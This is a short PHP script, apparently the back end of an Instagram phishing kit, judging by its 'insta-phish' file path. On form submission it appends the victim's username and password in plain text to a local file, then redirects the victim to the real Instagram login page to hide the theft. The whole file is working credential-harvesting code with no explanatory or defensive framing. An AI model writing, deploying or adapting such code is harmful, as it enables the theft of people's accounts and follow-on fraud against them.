<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // Open file in append mode and write username and password
    $execute = fopen("/home/vector/Dokumen/insta-phish/result.txt", "a") or die("Unable to open file");
    fwrite($execute, "username: " . $username . "\n");
    fwrite($execute, "password: " . $password . "\n\n");
    fclose($execute);

    // Redirect to Instagram after writing to the file
    header("Location: https://www.instagram.com/");
    exit;
}
?>
